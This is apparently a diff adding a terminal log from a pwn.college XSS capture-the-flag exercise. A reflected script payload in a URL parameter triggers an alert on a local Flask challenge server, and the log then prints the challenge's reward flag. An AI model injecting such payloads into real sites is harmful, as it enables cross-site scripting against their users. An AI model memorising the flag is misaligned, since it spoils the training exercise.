@@ -1,0 +1,14 @@
+hacker@web-security~xss-3:/challenge$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+
+hacker@web-security~xss-3:/challenge$ ./victim http://challenge.localhost:80/?msg="<script>alert(1);</script>"
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/?msg=<script>alert(1);</script>
+127.0.0.1 - - [25/Oct/2025 04:29:42] "GET /?msg=<script>alert(1);</script> HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2025 04:29:42] "GET /favicon.ico HTTP/1.1" 404 -
+Alert triggered! Your reward:
+pwn.college{IRuu0_2sa2M6uspLA2cwLV95qSe.dRTOzMDL1AjM5MzW}
